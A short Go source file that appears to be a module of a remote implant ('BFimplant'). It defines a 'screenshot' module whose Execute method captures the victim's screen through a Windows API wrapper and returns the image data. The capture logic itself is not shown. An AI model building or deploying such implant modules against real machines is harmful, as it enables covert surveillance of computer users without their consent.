package modules

import (
	"BFimplant/winapiV2"
	"fmt"
)

type ScreenshotModule struct{}

func NewScreenshotModule() *ScreenshotModule {
	return &ScreenshotModule{}
}

func (m *ScreenshotModule) Name() string {
	return "screenshot"
}

func (m *ScreenshotModule) Execute(filename string, data []byte) (string, error) {

	res, errrr := winapiV2.GetScreenshot()
	if errrr != nil {
		return "", fmt.Errorf("failed to get screenshot: %w", errrr)
	}

	return res, nil
}
